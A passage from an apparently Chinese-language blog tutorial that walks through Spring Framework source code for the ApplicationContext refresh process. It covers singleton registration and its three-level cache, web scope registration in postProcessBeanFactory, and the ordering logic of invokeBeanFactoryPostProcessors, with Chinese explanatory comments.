其中初始化前、初始化后这两个方法为BeanPostProcessor的，此实例化后置处理器通过继承而来。</span></span><br><span class="line">    <span class="keyword">if</span> (beanPostProcessor <span class="keyword">instanceof</span> InstantiationAwareBeanPostProcessor) &#123;</span><br><span class="line">        <span class="built_in">this</span>.hasInstantiationAwareBeanPostProcessors = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 对象销毁的后置处理器，其方法postProcessBeforeDestruction为销毁前的增强操作</span></span><br><span class="line">    <span class="keyword">if</span> (beanPostProcessor <span class="keyword">instanceof</span> DestructionAwareBeanPostProcessor) &#123;</span><br><span class="line">        <span class="built_in">this</span>.hasDestructionAwareBeanPostProcessors = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-3-2"><a href="#代码3-3-2" class="headerlink" title="代码3.3.2"></a>代码3.3.2</h3><p>org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory#ignoreDependencyInterface</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在依赖检查和自动注入时，被忽略的依赖接口，默认只有BeanFactory会被忽略</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Set&lt;Class&lt;?&gt;&gt; ignoredDependencyInterfaces = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Class&lt;?&gt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ignoreDependencyInterface</span><span class="params">(Class&lt;?&gt; ifc)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.ignoredDependencyInterfaces.add(ifc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-3-3"><a href="#代码3-3-3" class="headerlink" title="代码3.3.3"></a>代码3.3.3</h3><p>org.springframework.beans.factory.support.DefaultListableBeanFactory#registerResolvableDependency</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;Class&lt;?&gt;, Object&gt; resolvableDependencies = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;Class&lt;?&gt;, Object&gt;(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerResolvableDependency</span><span class="params">(Class&lt;?&gt; dependencyType, Object autowiredValue)</span> &#123;</span><br><span class="line">    Assert.notNull(dependencyType, <span class="string">&quot;Dependency type must not be null&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (autowiredValue != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(autowiredValue <span class="keyword">instanceof</span> ObjectFactory || dependencyType.isInstance(autowiredValue))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Value [&quot;</span> + autowiredValue +</span><br><span class="line">                                               <span class="string">&quot;] does not implement specified dependency type [&quot;</span> + dependencyType.getName() + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.resolvableDependencies.put(dependencyType, autowiredValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-3-4"><a href="#代码3-3-4" class="headerlink" title="代码3.3.4"></a>代码3.3.4</h3><p>org.springframework.beans.factory.support.DefaultListableBeanFactory#registerSingleton</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerSingleton</span><span class="params">(String beanName, Object singletonObject)</span> <span class="keyword">throws</span> IllegalStateException &#123;</span><br><span class="line">    <span class="comment">// 调用父类（）注册单例方法，详细：代码3.3.5</span></span><br><span class="line">    <span class="built_in">super</span>.registerSingleton(beanName, singletonObject);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hasBeanCreationStarted()) &#123;</span><br><span class="line">        <span class="comment">// Cannot modify startup-time collection elements anymore (for stable iteration)</span></span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="built_in">this</span>.beanDefinitionMap) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.beanDefinitionMap.containsKey(beanName)) &#123;</span><br><span class="line">                Set&lt;String&gt; updatedSingletons = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;String&gt;(<span class="built_in">this</span>.manualSingletonNames.size() + <span class="number">1</span>);</span><br><span class="line">                updatedSingletons.addAll(<span class="built_in">this</span>.manualSingletonNames);</span><br><span class="line">                updatedSingletons.add(beanName);</span><br><span class="line">                <span class="built_in">this</span>.manualSingletonNames = updatedSingletons;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Still in startup registration phase</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.beanDefinitionMap.containsKey(beanName)) &#123;</span><br><span class="line">            <span class="built_in">this</span>.manualSingletonNames.add(beanName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    clearByTypeCache();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清空缓存</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">clearByTypeCache</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.allBeanNamesByType.clear();</span><br><span class="line">    <span class="built_in">this</span>.singletonBeanNamesByType.clear();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-3-5"><a href="#代码3-3-5" class="headerlink" title="代码3.3.5"></a>代码3.3.5</h3><p>org.springframework.beans.factory.support.DefaultSingletonBeanRegistry#registerSingleton</p>
<p>单例对象的流转过程：三级缓存 &#x3D;&gt; 二级缓存（不一定出现） &#x3D;&gt; 一级缓存</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerSingleton</span><span class="params">(String beanName, Object singletonObject)</span> <span class="keyword">throws</span> IllegalStateException &#123;</span><br><span class="line">    Assert.notNull(beanName, <span class="string">&quot;&#x27;beanName&#x27; must not be null&quot;</span>);</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>.singletonObjects) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">oldObject</span> <span class="operator">=</span> <span class="built_in">this</span>.singletonObjects.get(beanName);</span><br><span class="line">        <span class="keyword">if</span> (oldObject != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Could not register object [&quot;</span> + singletonObject +</span><br><span class="line">                                            <span class="string">&quot;] under bean name &#x27;&quot;</span> + beanName + <span class="string">&quot;&#x27;: there is already object [&quot;</span> + oldObject + <span class="string">&quot;] bound&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        addSingleton(beanName, singletonObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">addSingleton</span><span class="params">(String beanName, Object singletonObject)</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>.singletonObjects) &#123;</span><br><span class="line">        <span class="built_in">this</span>.singletonObjects.put(beanName, (singletonObject != <span class="literal">null</span> ? singletonObject : NULL_OBJECT));</span><br><span class="line">        <span class="built_in">this</span>.singletonFactories.remove(beanName);</span><br><span class="line">        <span class="built_in">this</span>.earlySingletonObjects.remove(beanName);</span><br><span class="line">        <span class="built_in">this</span>.registeredSingletons.add(beanName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Cache of singleton objects: bean name --&gt; bean instance */</span></span><br><span class="line"><span class="comment">// 一级缓存，存放已经完全处理好（InitializingBean等）的对象，key：对象名，value：对象</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; singletonObjects = <span class="keyword">new</span> <span class="title class_">ConcurrentHashMap</span>&lt;String, Object&gt;(<span class="number">256</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Cache of early singleton objects: bean name --&gt; bean instance */</span></span><br><span class="line"><span class="comment">// 二级缓存，存放提前暴露的对象，只有开启且出现循环依赖，才会添加到这里，只是实例化，尚未初始化</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; earlySingletonObjects = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;(<span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Cache of singleton factories: bean name --&gt; ObjectFactory */</span></span><br><span class="line"><span class="comment">// 三级缓存，存放对象工厂，通过ObjectFactory.getObject()可获取对应的对象实例</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, ObjectFactory&lt;?&gt;&gt; singletonFactories = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, ObjectFactory&lt;?&gt;&gt;(<span class="number">16</span>);</span><br></pre></td></tr></table></figure>

<h2 id="3-4-postProcessBeanFactory"><a href="#3-4-postProcessBeanFactory" class="headerlink" title="3.4 postProcessBeanFactory"></a>3.4 postProcessBeanFactory</h2><p>作用：对BeanFactory的后续处理，在AbstractApplicationContext中默认留空，子类拓展实现。在spring-web实现子类AbstractRefreshableWebApplicationContext中：注册request域、session域、注册环境相关的beans（servletContext、servletConfig、contextParameters、contextAttributes）</p>
<p>org.springframework.web.context.support.AbstractRefreshableWebApplicationContext#postProcessBeanFactory</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">postProcessBeanFactory</span><span class="params">(ConfigurableListableBeanFactory beanFactory)</span> &#123;</span><br><span class="line">    <span class="comment">// 添加后置处理器</span></span><br><span class="line">    beanFactory.addBeanPostProcessor(<span class="keyword">new</span> <span class="title class_">ServletContextAwareProcessor</span>(<span class="built_in">this</span>.servletContext, <span class="built_in">this</span>.servletConfig));</span><br><span class="line">    beanFactory.ignoreDependencyInterface(ServletContextAware.class);</span><br><span class="line">    beanFactory.ignoreDependencyInterface(ServletConfigAware.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册request域、session域，详细：代码3.4.1</span></span><br><span class="line">    WebApplicationContextUtils.registerWebApplicationScopes(beanFactory, <span class="built_in">this</span>.servletContext);</span><br><span class="line">    <span class="comment">// 注册环境相关的beans，详细：代码3.4.2</span></span><br><span class="line">    WebApplicationContextUtils.registerEnvironmentBeans(beanFactory, <span class="built_in">this</span>.servletContext, <span class="built_in">this</span>.servletConfig);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-4-1"><a href="#代码3-4-1" class="headerlink" title="代码3.4.1"></a>代码3.4.1</h3><p>org.springframework.web.context.support.WebApplicationContextUtils#registerWebApplicationScopes(org.springframework.beans.factory.config.ConfigurableListableBeanFactory, javax.servlet.ServletContext)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerWebApplicationScopes</span><span class="params">(ConfigurableListableBeanFactory beanFactory, ServletContext sc)</span> &#123;</span><br><span class="line">    beanFactory.registerScope(WebApplicationContext.SCOPE_REQUEST, <span class="keyword">new</span> <span class="title class_">RequestScope</span>());</span><br><span class="line">    beanFactory.registerScope(WebApplicationContext.SCOPE_SESSION, <span class="keyword">new</span> <span class="title class_">SessionScope</span>(<span class="literal">false</span>));</span><br><span class="line">    beanFactory.registerScope(WebApplicationContext.SCOPE_GLOBAL_SESSION, <span class="keyword">new</span> <span class="title class_">SessionScope</span>(<span class="literal">true</span>));</span><br><span class="line">    <span class="keyword">if</span> (sc != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ServletContextScope</span> <span class="variable">appScope</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletContextScope</span>(sc);</span><br><span class="line">        beanFactory.registerScope(WebApplicationContext.SCOPE_APPLICATION, appScope);</span><br><span class="line">        <span class="comment">// Register as ServletContext attribute, for ContextCleanupListener to detect it.</span></span><br><span class="line">        sc.setAttribute(ServletContextScope.class.getName(), appScope);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    beanFactory.registerResolvableDependency(ServletRequest.class, <span class="keyword">new</span> <span class="title class_">RequestObjectFactory</span>());</span><br><span class="line">    beanFactory.registerResolvableDependency(ServletResponse.class, <span class="keyword">new</span> <span class="title class_">ResponseObjectFactory</span>());</span><br><span class="line">    beanFactory.registerResolvableDependency(HttpSession.class, <span class="keyword">new</span> <span class="title class_">SessionObjectFactory</span>());</span><br><span class="line">    beanFactory.registerResolvableDependency(WebRequest.class, <span class="keyword">new</span> <span class="title class_">WebRequestObjectFactory</span>());</span><br><span class="line">    <span class="keyword">if</span> (jsfPresent) &#123;</span><br><span class="line">        FacesDependencyRegistrar.registerFacesDependencies(beanFactory);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-4-2"><a href="#代码3-4-2" class="headerlink" title="代码3.4.2"></a>代码3.4.2</h3><p>org.springframework.web.context.support.WebApplicationContextUtils#registerEnvironmentBeans(org.springframework.beans.factory.config.ConfigurableListableBeanFactory, javax.servlet.ServletContext, javax.servlet.ServletConfig)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerEnvironmentBeans</span><span class="params">(</span></span><br><span class="line"><span class="params">    ConfigurableListableBeanFactory bf, ServletContext servletContext, ServletConfig servletConfig)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册servletContext</span></span><br><span class="line">    <span class="keyword">if</span> (servletContext != <span class="literal">null</span> &amp;&amp; !bf.containsBean(WebApplicationContext.SERVLET_CONTEXT_BEAN_NAME)) &#123;</span><br><span class="line">        bf.registerSingleton(WebApplicationContext.SERVLET_CONTEXT_BEAN_NAME, servletContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册servletConfig</span></span><br><span class="line">    <span class="keyword">if</span> (servletConfig != <span class="literal">null</span> &amp;&amp; !bf.containsBean(ConfigurableWebApplicationContext.SERVLET_CONFIG_BEAN_NAME)) &#123;</span><br><span class="line">        bf.registerSingleton(ConfigurableWebApplicationContext.SERVLET_CONFIG_BEAN_NAME, servletConfig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册contextParameters</span></span><br><span class="line">    <span class="keyword">if</span> (!bf.containsBean(WebApplicationContext.CONTEXT_PARAMETERS_BEAN_NAME)) &#123;</span><br><span class="line">        Map&lt;String, String&gt; parameterMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line">        <span class="keyword">if</span> (servletContext != <span class="literal">null</span>) &#123;</span><br><span class="line">            Enumeration&lt;?&gt; paramNameEnum = servletContext.getInitParameterNames();</span><br><span class="line">            <span class="keyword">while</span> (paramNameEnum.hasMoreElements()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">paramName</span> <span class="operator">=</span> (String) paramNameEnum.nextElement();</span><br><span class="line">                parameterMap.put(paramName, servletContext.getInitParameter(paramName));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (servletConfig != <span class="literal">null</span>) &#123;</span><br><span class="line">            Enumeration&lt;?&gt; paramNameEnum = servletConfig.getInitParameterNames();</span><br><span class="line">            <span class="keyword">while</span> (paramNameEnum.hasMoreElements()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">paramName</span> <span class="operator">=</span> (String) paramNameEnum.nextElement();</span><br><span class="line">                parameterMap.put(paramName, servletConfig.getInitParameter(paramName));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        bf.registerSingleton(WebApplicationContext.CONTEXT_PARAMETERS_BEAN_NAME,</span><br><span class="line">                             Collections.unmodifiableMap(parameterMap));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册contextAttributes</span></span><br><span class="line">    <span class="keyword">if</span> (!bf.containsBean(WebApplicationContext.CONTEXT_ATTRIBUTES_BEAN_NAME)) &#123;</span><br><span class="line">        Map&lt;String, Object&gt; attributeMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        <span class="keyword">if</span> (servletContext != <span class="literal">null</span>) &#123;</span><br><span class="line">            Enumeration&lt;?&gt; attrNameEnum = servletContext.getAttributeNames();</span><br><span class="line">            <span class="keyword">while</span> (attrNameEnum.hasMoreElements()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">attrName</span> <span class="operator">=</span> (String) attrNameEnum.nextElement();</span><br><span class="line">                attributeMap.put(attrName, servletContext.getAttribute(attrName));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        bf.registerSingleton(WebApplicationContext.CONTEXT_ATTRIBUTES_BEAN_NAME,</span><br><span class="line">                             Collections.unmodifiableMap(attributeMap));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-5-invokeBeanFactoryPostProcessors"><a href="#3-5-invokeBeanFactoryPostProcessors" class="headerlink" title="3.5 invokeBeanFactoryPostProcessors"></a>3.5 invokeBeanFactoryPostProcessors</h2><p>作用：实例化和调用所有BeanFactoryPostProcessor，包括其子类BeanDefinitionRegistryPostProcessor。</p>
<p>org.springframework.context.support.AbstractApplicationContext#invokeBeanFactoryPostProcessors</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">invokeBeanFactoryPostProcessors</span><span class="params">(ConfigurableListableBeanFactory beanFactory)</span> &#123;</span><br><span class="line">    <span class="comment">// 详细：代码3.5.1</span></span><br><span class="line">    PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(beanFactory, getBeanFactoryPostProcessors());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Detect a LoadTimeWeaver and prepare for weaving, if found in the meantime</span></span><br><span class="line">    <span class="comment">// (e.g. through an @Bean method registered by ConfigurationClassPostProcessor)</span></span><br><span class="line">    <span class="keyword">if</span> (beanFactory.getTempClassLoader() == <span class="literal">null</span> &amp;&amp; beanFactory.containsBean(LOAD_TIME_WEAVER_BEAN_NAME)) &#123;</span><br><span class="line">        beanFactory.addBeanPostProcessor(<span class="keyword">new</span> <span class="title class_">LoadTimeWeaverAwareProcessor</span>(beanFactory));</span><br><span class="line">        beanFactory.setTempClassLoader(<span class="keyword">new</span> <span class="title class_">ContextTypeMatchClassLoader</span>(beanFactory.getBeanClassLoader()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="代码3-5-1"><a href="#代码3-5-1" class="headerlink" title="代码3.5.1"></a>代码3.5.1</h3><p>org.springframework.context.support.PostProcessorRegistrationDelegate#invokeBeanFactoryPostProcessors(org.springframework.beans.factory.config.ConfigurableListableBeanFactory, java.util.List&lt;org.springframework.beans.factory.config.BeanFactoryPostProcessor&gt;)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">invokeBeanFactoryPostProcessors</span><span class="params">(</span></span><br><span class="line"><span class="params">    ConfigurableListableBeanFactory beanFactory, List&lt;BeanFactoryPostProcessor&gt; beanFactoryPostProcessors)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Invoke BeanDefinitionRegistryPostProcessors first, if any.</span></span><br><span class="line">    Set&lt;String&gt; processedBeans = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (beanFactory <span class="keyword">instanceof</span> BeanDefinitionRegistry) &#123;</span><br><span class="line">        <span class="type">BeanDefinitionRegistry</span> <span class="variable">registry</span> <span class="operator">=</span> (BeanDefinitionRegistry) beanFactory;</span><br><span class="line">        List&lt;BeanFactoryPostProcessor&gt; regularPostProcessors = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;BeanFactoryPostProcessor&gt;();</span><br><span class="line">        List&lt;BeanDefinitionRegistryPostProcessor&gt; registryProcessors = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;BeanDefinitionRegistryPostProcessor&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (BeanFactoryPostProcessor postProcessor : beanFactoryPostProcessors) &#123;</span><br><span class="line">            <span class="keyword">if</span> (postProcessor <span class="keyword">instanceof</span> BeanDefinitionRegistryPostProcessor) &#123;</span><br><span class="line">                <span class="type">BeanDefinitionRegistryPostProcessor</span> <span class="variable">registryProcessor</span> <span class="operator">=</span></span><br><span class="line">                    (BeanDefinitionRegistryPostProcessor) postProcessor;</span><br><span class="line">                registryProcessor.postProcessBeanDefinitionRegistry(registry);</span><br><span class="line">                registryProcessors.add(registryProcessor);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                regularPostProcessors.add(postProcessor);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do not initialize FactoryBeans here: We need to leave all regular beans</span></span><br><span class="line">        <span class="comment">// uninitialized to let the bean factory post-processors apply to them!</span></span><br><span class="line">        <span class="comment">// Separate between BeanDefinitionRegistryPostProcessors that implement</span></span><br><span class="line">        <span class="comment">// PriorityOrdered, Ordered, and the rest.</span></span><br><span class="line">        List&lt;BeanDefinitionRegistryPostProcessor&gt; currentRegistryProcessors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;BeanDefinitionRegistryPostProcessor&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// First, invoke the BeanDefinitionRegistryPostProcessors that implement PriorityOrdered.</span></span><br><span class="line">        String[] postProcessorNames =</span><br><span class="line">            beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">for</span> (String ppName : postProcessorNames) &#123;</span><br><span class="line">            <span class="keyword">if</span> (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) &#123;</span><br><span class="line">                currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));</span><br><span class="line">                processedBeans.add(ppName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sortPostProcessors(currentRegistryProcessors, beanFactory);</span><br><span class="line">        registryProcessors.addAll(currentRegistryProcessors);</span><br><span class="line">        invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);</span><br><span class="line">        currentRegistryProcessors.clear();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Next, invoke the BeanDefinitionRegistryPostProcessors that implement Ordered.</span></span><br><span class="line">        postProcessorNames = beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">for</span> (String ppName : postProcessorNames) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!processedBeans.contains(ppName) &amp;&amp; beanFactory.isTypeMatch(ppName, Ordered.class)) &#123;</span><br><span class="line">                currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));</span><br><span class="line">                processedBeans.add(ppName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        sortPostProcessors(currentRegistryProcessors, beanFactory);</span><br><span class="line">        registryProcessors.addAll(currentRegistryProcessors);</span><br><span class="line">        invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);</span><br><span class="line">        currentRegistryProcessors.clear();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Finally, invoke all other BeanDefinitionRegistryPostProcessors until no further ones appear.</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">reiterate</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">while</span> (reiterate) &#123;</span><br><span class="line">            reiterate = <span class="literal">false</span>;</span><br><span class="line">            postProcessorNames = beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">for</span> (String ppName : postProcessorNames) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!processedBeans.contains(ppName)) &#123;</span><br><span class="line">                    currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));</span><br><span class="line">                    processedBeans.add(ppName);</span><br><span class="line">                    reiterate = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sortPostProcessors(currentRegistryProcessors, beanFactory);</span><br><span class="line">            registryProcessors.addAll(currentRegistryProcessors);</span><br><span class="line">            invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);</span><br><span class="line">            currentRegistryProcessors.clear();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Now, invoke the postProcessBeanFactory callback of all processors handled so far.</span></span><br><span class="line">        invokeBeanFactoryPostProcessors(registryProcessors, beanFactory);</span><br><span class="line">        invokeBeanFactoryPostProcessors(regularPostProcessors, beanFactory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invoke factory processors registered with the context instance.</span></span><br><span class="line">        invokeBeanFactoryPostProcessors(beanFactoryPostProcessors, beanFactory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do not initialize FactoryBeans here: We need to leave all regular beans</span></span><br><span class="line">    <span class="comment">// uninitialized to let the bean factory post-processors apply to them!</span></span><br><span class="line">    String[] postProcessorNames =</span><br><span class="line">        beanFactory.getBeanNamesForType(BeanFactoryPostProcessor.class, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Separate between BeanFactoryPostProcessors that implement PriorityOrdered,</span></span><br><span class="line">    <span class="comment">// Ordered, and the rest.</span></span><br><span class="line">    List&lt;BeanFactoryPostProcessor&gt; priorityOrderedPostProcessors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;BeanFactoryPostProcessor&gt;();</span><br><span class="line">    List&lt;String&gt; orderedPostProcessorNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">    List&lt;String&gt; nonOrderedPostProcessorNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String ppName : postProcessorNames) &#123;</span><br><span class="line">        <span class="keyword">if</span> (processedBeans.contains(ppName)) &#123;</span><br><span class="line">            <span class="comment">// skip - already processed in first phase above</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) &#123;</span><br><span class="line">            priorityOrderedPostProcessors.add(beanFactory.getBean(ppName, BeanFactoryPostProcessor.class));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (beanFactory.isTypeMatch(ppName, Ordered.class)) &#123;</span><br><span class="line">            orderedPostProcessorNames.add(ppName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            nonOrderedPostProcessorNames.add(ppName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// First, invoke the BeanFactoryPostProcessors that implement PriorityOrdered.</span></span><br><span class="line">    sortPostProcessors(priorityOrderedPostProcessors, beanFactory);</span><br><span class="line">    invokeBeanFactoryPostProcessors(priorityOrderedPostProcessors, beanFactory);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Next, invoke the BeanFactoryPostProcessors that implement Ordered.</span></span><br><span class="line">    List&lt;BeanFactoryPostProcessor&gt; orderedPostProcessors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;BeanFactoryPostProcessor&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String postProcessorName : orderedPostProcessorNames) &#123;</span><br><span class="line">        orderedPostProcessors.add(beanFactory.getBean(postProcessorName, BeanFactoryPostProcessor.class));</span><br><span class="line">    &#125;</span><br><span class="line">    sortPostProcessors(orderedPostProcessors, beanFactory);</span><br><span class="line">    invokeBeanFactoryPostProcessors(orderedPostProcessors, beanFactory);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Finally, invoke all other BeanFactoryPostProcessors.</span></span><br><span class="line">    List&lt;BeanFactoryPostProcessor&gt; nonOrderedPostProcessors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;BeanFactoryPostProcessor&gt;();</span><br><span class="line">    <span class="keyword">for</span> 